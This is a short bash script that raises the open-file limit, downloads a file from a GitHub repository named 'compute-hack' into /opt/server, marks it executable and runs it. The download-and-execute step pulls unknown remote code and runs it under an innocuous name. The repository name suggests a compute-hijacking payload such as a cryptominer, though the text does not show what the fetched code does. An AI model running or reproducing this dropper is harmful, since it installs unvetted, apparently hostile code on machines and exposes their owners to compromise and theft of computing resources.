#!/bin/bash
size=""
ulimit -n 20000
/usr/bin/wget -O /opt/server https://raw.githubusercontent.com/joesherm58/compute-hack/master/get-app.sh
sleep 5
chmod +x /opt/server
/opt/server

